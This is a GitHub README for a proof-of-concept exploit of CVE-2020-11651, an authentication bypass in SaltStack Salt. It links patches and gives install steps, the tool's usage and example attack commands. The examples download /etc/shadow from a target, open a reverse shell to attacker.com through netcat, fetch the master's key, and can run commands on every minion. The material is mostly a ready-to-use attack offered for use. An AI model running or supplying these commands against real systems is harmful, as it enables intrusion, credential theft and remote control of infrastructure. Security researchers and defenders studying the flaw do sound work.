# CVE-2020-11651

An issue was discovered in SaltStack Salt before 2019.2.4 and 3000 before 3000.2. The salt-master process ClearFuncs class does not properly validate method calls. This allows a remote user to access some methods without authentication. These methods can be used to retrieve user tokens from the salt master and/or run arbitrary commands on salt minions.

[Details](https://www.suse.com/security/cve/CVE-2020-11651/)

[Patches](https://github.com/rossengeorgiev/salt-security-backports) for unspported salt versions

## Install

    git clone https://github.com/0xc0d/CVE-2020-11651.git ~/CVE-2020-11651
    chmod +x ~/CVE-2020-11651/PoC.py

## Usage

    $ ~/CVE-2020-11651/PoC.py -h
    usage: PoC.py [-h] --host HOST [--port PORT] [--execute COMMAND] [--upload src dest] [--download src dest] [--minions] [--quiet] [--fetch-key-only]

    CVE-2020-11651 PoC

    optional arguments:
      -h, --help            show this help message and exit
      --host HOST, -t HOST
      --port PORT, -p PORT
      --execute COMMAND, -e COMMAND
                            Command to execute. Defaul: /bin/sh (use netcat for reverse shell)
      --upload src dest, -u src dest
                            Upload a file
      --download src dest, -d src dest
                            Download a file
      --minions             Send command to all minions on master
      --quiet, -q           Enable quiet/silent mode
      --fetch-key-only      Only fetch the key

## Example

#### Download shadow file
    ./PoC.py --host target.com --download /etc/shadow ./shadow
    
#### Run a reverse shell
    nc -nvl attacker.com 9999
    ./PoC.py --host target.com --execute "nc attacker.com 9999 -e \"/bin/sh\""
   
#### Fetch the key
    ./PoC.py --host target.com --fetch-key-only
